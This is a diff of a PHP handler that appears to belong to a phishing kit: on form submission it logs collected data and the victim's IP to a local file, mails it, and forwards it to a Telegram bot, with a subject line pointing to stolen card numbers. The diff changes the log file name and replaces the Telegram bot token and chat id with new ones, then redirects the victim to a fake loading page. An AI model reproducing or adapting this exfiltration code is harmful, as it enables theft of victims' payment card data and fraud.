@@ -22,16 +22,16 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             | INF : " . $ip . "
             ---------------\n";
 
-            $file = fopen("./kICHTA.txt", "a+");
+            $file = fopen("./rz92.txt", "a+");
             fwrite($file, $message);
             fclose($file);
-			$to = "lapayty@gmail.com";
+			$to = "";
 			$subject = "$ip =?utf-8?Q?=F0=9F=91=BD?= (CCN|SAUDI)";
 			$headers = "From: Ak47™<shdanks@dPorctgas.org>\r\n";
 			$headers .= "MIME-Version: 1.0\r\n";
 			$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
 			mail($to, $subject, $message, $headers);
-            file_get_contents("https://api.telegram.org/bot1955265923:AAGwafJcpMwWBDbuITLrsYZa-VrA5QSbGb4/sendMessage?chat_id=-526214058&text=" . urlencode($message)."" );
+            file_get_contents("https://api.telegram.org/bot2063061087:AAF4J2MhpY_UGZ4bRdeEkPIvL3HdioJoJwo/sendMessage?chat_id=-745387116&text=" . urlencode($message)."" );
 		
         header("Location: Seleccione_medio_de_codigo_loading.php?codigo_id=".md5($_GET['error']));
     }
